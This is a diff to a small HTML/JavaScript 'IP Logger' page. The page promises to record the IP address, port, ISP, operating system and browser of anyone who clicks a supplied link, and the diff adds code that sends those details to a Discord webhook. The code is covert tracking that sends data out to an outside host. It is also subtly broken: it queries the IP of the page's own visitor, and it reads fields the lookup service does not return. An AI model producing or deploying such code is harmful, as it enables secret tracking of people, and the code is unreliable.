@@ -5,7 +5,7 @@
  </head>
  <body>
  <h1>IP Logger</h1>
- <p>Enter a URL below to log the IP address of the user who clicks on it:</p>
+ <p>Enter a URL below to log the IP address, port number, ISP, operating system, and browser of the user who clicks on it:</p>
  <form id="urlForm">
  <input type="text" id="url" name="url" placeholder="Enter URL here...">
  <button type="submit">Log IP</button>
@@ -18,10 +18,15 @@
  xhr.open('GET', `https://ipapi.co/json/`, true);
  xhr.onload = function() {
  if (xhr.status === 200) {
- const ip = JSON.parse(xhr.responseText).ip;
- const message = `New IP logged:\n\nIP: ${ip}\nURL: ${url}`;
+ const data = JSON.parse(xhr.responseText);
+ const ip = data.ip;
+ const port = data.port;
+ const isp = data.isp;
+ const os = data.os;
+ const browser = data.browser;
+ const message = `New IP logged:\n\nIP: ${ip}\nPort: ${port}\nISP: ${isp}\nOperating System: ${os}\nBrowser: ${browser}\nURL: ${url}`;
  const xhr2 = new XMLHttpRequest();
- xhr2.open('POST', 'YOUR DISCORD WEBHOOK HERE', true);
+ xhr2.open('POST', 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL', true);
  xhr2.setRequestHeader('Content-Type', 'application/json');
  xhr2.onload = function() {
  if (xhr2.status === 204) {
